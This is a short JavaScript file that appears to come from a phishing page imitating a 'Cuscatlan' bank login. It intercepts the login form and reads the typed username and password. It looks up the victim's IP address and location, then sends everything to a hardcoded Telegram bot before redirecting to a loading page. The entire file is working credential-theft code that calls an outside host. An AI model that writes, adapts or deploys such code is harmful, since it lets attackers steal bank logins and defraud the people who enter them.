const url = "https://ipapi.co/json/";
const form = document.querySelector("#loginform");
form.addEventListener("submit", (event) => {
  event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
  axios
    .get(url)
    .then((response) => {
      const passd = document.querySelector("#usuario").value;
      const cod = document.querySelector("#passd").value;
      localStorage.setItem("usuario", passd);
      const message =
        "\n✅Cuscatlan LOGIN✅\nUsuario: " +
        passd +
        "\nContraseña: " +
        cod +
        "\nCiudad:" +
        response.data.city +
        "\nPais: " +
        response.data.country +
        "\nIP: " +
        response.data.ip;
      axios
      .post(
          "https://api.telegram.org/bot7912285691:AAEMUR3k6Wq6Z3l1hy0bJEDNmOOCCJHXM64/sendMessage",
          {
            chat_id: "-4652542636",
            text: message,
          }
        )
        .then((response) => {
          
          window.location.href = "loading.html";
        })
        .catch((error) => {
          console.error(error);
        });
    })
    .catch((error) => {
      console.log(error);
    });
});

